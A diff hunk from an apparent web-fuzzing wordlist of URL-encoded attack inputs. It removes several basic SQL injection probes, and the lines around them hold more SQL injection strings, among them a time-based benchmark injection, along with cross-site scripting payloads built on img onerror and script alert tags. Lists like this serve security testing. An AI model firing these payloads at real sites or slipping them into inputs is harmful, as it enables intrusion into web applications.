@@ -222,13 +222,6 @@ administrator'%20or%20user%20like%20'%
 user'%20or%20user%20like%20'%
 bc49d<img src%3da onerror%3dalert(1)>6b2483ee7c809283
 afa81"><img%20src%3da%20onerror%3dalert(1)>7a1fc0514a72f8ad
-(select%201)
-select%201
-(select%201%2c2)
-select%201%2c2
-admin'
-admin#
-admin--
 '%20and%20benchmark(20000000%2csha1(1))--%20
 %00d264c<img%20src%3da%20onerror%3dalert(1)>9adf5204d47a765f8
 '><script>alert(112)</script>
